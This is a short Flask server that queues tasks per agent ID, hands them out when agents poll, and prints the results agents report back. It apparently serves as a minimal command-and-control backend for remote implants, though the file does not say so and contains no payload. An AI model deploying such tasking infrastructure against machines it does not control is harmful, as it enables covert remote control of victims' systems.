from flask import Flask, request, jsonify
import os, json

app = Flask(__name__)
DATA_DIR = "data"
if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

def get_task_file(agent_id):
    return os.path.join(DATA_DIR, f"{agent_id}_tasks.json")

def load_tasks(agent_id):
    path = get_task_file(agent_id)
    if os.path.exists(path):
        with open(path) as f:
            return json.load(f)
    return []

def save_tasks(agent_id, tasks):
    with open(get_task_file(agent_id), "w") as f:
        json.dump(tasks, f)

@app.route("/api/update/<agent_id>", methods=["POST", "GET"])
def update(agent_id):
    tasks = load_tasks(agent_id)
    save_tasks(agent_id, [])  # Clear tasks after sending
    return jsonify(tasks)

@app.route("/api/report", methods=["POST"])
def report():
    data = request.json
    agent_id = data.get("agent_id")
    result = data.get("result")
    if agent_id and result:
        print(f"[REPORT] {agent_id}:\n{result}")
        return "OK"
    return "ERROR", 400

@app.route("/api/queue/<agent_id>", methods=["POST"])
def queue_task(agent_id):
    task = request.json.get("task")
    if not task:
        return "Missing task", 400
    tasks = load_tasks(agent_id)
    tasks.append(task)
    save_tasks(agent_id, tasks)
    return "Task Queued"

if __name__ == "__main__":
    app.run(debug=False)
